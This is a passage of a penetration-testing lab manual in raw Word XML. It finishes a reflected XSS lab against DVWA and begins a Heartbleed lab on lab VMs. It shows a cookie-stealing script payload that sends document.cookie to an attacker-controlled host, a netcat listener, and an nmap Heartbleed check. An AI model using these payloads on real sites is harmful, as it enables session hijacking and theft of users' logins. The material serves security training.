    <w:p w14:paraId="120947C6" w14:textId="7947E810" w:rsidR="0023150F" w:rsidRPr="00B31078" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B31078">
        <w:t>http://192.168.</w:t>
      </w:r>
      <w:r w:rsidR="00A851F4">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve">.99/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27bob%2 7%29%3C%2Fscript%3E# </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091323AA" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve">Visiting the above URL would also run the script in the victim's browser. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4BF518" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="03066660" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t>Step 3: Stealing a Session Cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27921D62" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B31078">
        <w:t>We could also steal the session cookie of anyone who clicks on the link:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7E0E66" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve">First </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B31078">
        <w:t>open up</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve"> a terminal window and type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFB28B6" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B31078" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B31078">
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B31078">
        <w:t>lvp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve"> 80 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="475596CC" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve">This opens a listener on port 80 of your Kali VM, meaning that any HTTP requests sent to your Kali VM will appear in your terminal window. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3986F14B" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B31078" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="08E39447" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B31078">
        <w:t>Next return to the reflected XSS page in your browser</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and r</w:t>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve">efresh the page to reset it. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBC2CF4" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00B31078">
        <w:t>Next type the following in the text input box</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (everything on one line)</w:t>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="57155937" w14:textId="4325944B" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00B31078">
        <w:t>&lt;script&gt;new Image().src</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B31078">
        <w:t>=”http://192.168.</w:t>
      </w:r>
      <w:r w:rsidR="00042988">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B31078">
        <w:t>.80/b.php</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B31078">
        <w:t xml:space="preserve">?”+document.cookie;&lt;/script&gt; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690C853E" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00B31078" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="20609BCE" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="001A0A0D" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="001A0A0D">
        <w:t xml:space="preserve">Press </w:t>
      </w:r>
      <w:r>
        <w:t>"S</w:t>
      </w:r>
      <w:r w:rsidRPr="001A0A0D">
        <w:t>ubmit</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="001A0A0D">
        <w:t xml:space="preserve">; you should get the following response in your terminal GUI: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3545E01D" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="001A0A0D" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="001A0A0D">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> INCLUDEPICTURE "C:\\var\\folders\\pw\\vm3q16yn7979gffjlgg9jrwc0000gn\\T\\com.microsoft.Word\\WebArchiveCopyPasteTempFiles\\page72image55120976" \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidRPr="001A0A0D">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1626CA9B" wp14:editId="69376044">
            <wp:extent cx="4633595" cy="1790065"/>
            <wp:effectExtent l="0" t="0" r="1905" b="635"/>
            <wp:docPr id="21" name="Picture 21" descr="page72image55120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age72image5512097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633595" cy="1790065"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="001A0A0D">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B38DCD" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="001A0A0D" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="001A0A0D">
        <w:t xml:space="preserve">The URL reads the following: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0753E671" w14:textId="3513384A" w:rsidR="0023150F" w:rsidRPr="001A0A0D" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="001A0A0D">
        <w:t>http://192.168.</w:t>
      </w:r>
      <w:r w:rsidR="00802021">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="001A0A0D">
        <w:t xml:space="preserve">.99/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Enew+Image%28%29. src%3D%27http%3A%2F%2F127.0.0.1%2F%3Fcookie%3D%27+%2B+encodeURI%28do </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001A0A0D">
        <w:t>cument.cookie</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001A0A0D">
        <w:t xml:space="preserve">%29%3B%3C%2Fscript%3E# </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FAFB1C" w14:textId="25EDF6CB" w:rsidR="0023150F" w:rsidRPr="00B31078" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="001A0A0D">
        <w:t xml:space="preserve">If we sent this to a </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001A0A0D">
        <w:t>victim</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001A0A0D">
        <w:t xml:space="preserve"> we would receive their session cookie; we could then potentially use this to steal their log-on session</w:t>
      </w:r>
      <w:r>
        <w:t>, without having their username/password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E801D90" w14:textId="226221B1" w:rsidR="0023150F" w:rsidRPr="00CD0EA2" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CD0EA2">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve">End of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Lab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43FB0696" w14:textId="60EA8415" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH1Module"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc24978031"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Lab</w:t>
      </w:r>
      <w:r w:rsidRPr="007F7488">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="007F7488">
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Exploiting the Heartbleed Bug</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="10388A47" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t>Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641D7AD7" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="003844FB" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">This lab is designed to demonstrate how to perform the Heartbleed attack using the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>MetaSploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Framework. This will be done in order to dump the contents of a vulnerable </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>web-server</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> using an unpatched version of OpenSSL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FE7B05" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12C264C2" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t>Overview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A01635" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">The Heartbleed bug is a serious vulnerability that was discovered to exist on </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>web-servers</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> using the OpenSSL cryptographic library, a popular implementation of the TLS protocol for web-servers. This exploit will work on any unpatched </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>web-servers</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> running an OpenSSL instance in either client or server mode. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0680BDC8" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">The vulnerability was disclosed in 2014, although the bug was found to have been present since a software patch in September 2012. It allows attackers to perform a "buffer over-read" attack, where they can read more information than they should be allowed to and can be used in order to read the entire contents of a web-server's memory buffer, an area where the server stores data ready for processing or that is yet to be overwritten by other processes. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FD62EC" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>It could include passwords, key strings, hashes and all manner of other sensitive information that other users are inputting onto the server during normal use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC8B339" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00909A75" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="001726F8">
        <w:t>Step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 1:</w:t>
      </w:r>
      <w:r w:rsidRPr="001726F8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Start up the Kali Linux and Heartbleed Server VMs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46821AA6" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>On the host machine make sure the Hyper-V Manager is opened and Kali Linux VM is running.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0845293A" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00825763" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C75073E" wp14:editId="00A396A4">
            <wp:extent cx="838200" cy="914400"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="657" name="Picture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 name="01.PNG"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="838200" cy="914400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="604B499F" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00645495" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">Double click on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00142200">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Heartbleed Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> VM from the list to load the VM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43543167" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="00571218">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF811B1" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>This VM will load without any further interaction from yourself; Wait for the VM to fully boot and the following screen is displayed, then you can minimise the window:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACB5B8A" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00346488" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1ED6BF23" wp14:editId="2F6F65FA">
            <wp:extent cx="5414930" cy="1226820"/>
            <wp:effectExtent l="0" t="0" r="0"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0">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect b="69792"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5427580" cy="1229686"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2683855E" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">On the Kali Linux VM open a terminal by selecting the icon </w:t>
      </w:r>
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5FA7F901" wp14:editId="4A088101">
            <wp:extent cx="381000" cy="410593"/>
            <wp:effectExtent l="0" t="0" r="0" b="889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1">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="796" t="21349" r="96048" b="74117"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="388666" cy="418855"/>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from the favourites bar on the left-hand side of the desktop.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA01E86" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Before continuing, ensure you can ping the Heartbleed Server VM from the Kali Linux VM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBFB711" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r>
        <w:t>ping 192.168.1.25</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78DF16CF" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="217B0B59" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00EB7EE4" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Use "Ctrl + C" to cancel the ping request and continue the exercise.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086F0A76" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t>Step 2: Navigate to the Victim Website</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F0FC07" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">In order to ensure we are attacking the correct IP, on the Kali Linux VM, open Firefox (by selecting the </w:t>
      </w:r>
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4349D93B" wp14:editId="031F8C6C">
            <wp:extent cx="350520" cy="350520"/>
            <wp:effectExtent l="0" t="0" r="0" b="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394" t="21655" r="97775" b="74643"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="350624" cy="350624"/>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icon from the left-hand toolbar on the desktop) and navigate to 192.168.1.95.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06016400" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>You will be delivered a webpage that simply states "test</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and the window title will read "FFFF".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E66041A" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="002F395F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="2AB84AD0" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="001726F8">
        <w:t>Step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 3:</w:t>
      </w:r>
      <w:r w:rsidRPr="001726F8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Test to Confirm the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Web-server</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is Vulnerable</w:t>
      </w:r>
      <w:r w:rsidRPr="00D454C8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1AE0A8" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">You will now use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> scripting to test that the server is vulnerable to the Heartbleed bug.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512977BA" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">Start up a new terminal session. You can do this by clicking the terminal icon </w:t>
      </w:r>
      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C5AB27F" wp14:editId="6E7E92DE">
            <wp:extent cx="381000" cy="410593"/>
            <wp:effectExtent l="0" t="0" r="0" b="889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1">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="796" t="21349" r="96048" b="74117"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="388666" cy="418855"/>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in the left-hand menu bar from the desktop or by using "Ctrl + Shift + N" in an existing terminal session window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE30D96" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Use the following command to test the victim's web-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>server</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="278D065D" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA68A8">
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA68A8">
        <w:t xml:space="preserve"> -p 443 --script </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA68A8">
        <w:t>ssl-heartbleed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA68A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">192.168.1.25 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6839F393" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00996F64" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> tool should return the following results to indicate that the server is, in fact, vulnerable to the Heartbleed attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12424DC9" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>You should see that about halfway through the script we are shown that the "State:" of the server is "VULNERABLE".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AEC368" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F"/>
    <w:p w14:paraId="0F8B26C7" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001726F8">
        <w:t>Step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4:</w:t>
      </w:r>
      <w:r w:rsidRPr="001726F8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Create Data to Extract from the Server</w:t>
      </w:r>
      <w:r w:rsidRPr="00D454C8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685B6A65" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00D454C8" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t xml:space="preserve">In order to demonstrate the power of this vulnerability, we need to create and send the server some data that we will later capture back from the memory buffers. In reality, this attack would just read whatever happened to be stored in the server's memory at the time of </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>exploit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> but we need to create our own for this exercise.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160D972F" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r>
        <w:t>Create a text file called "secrets" and open it for editing with the nano text editor by entering the following command into the terminal window:</w:t>
      </w:r>
    </w:p>
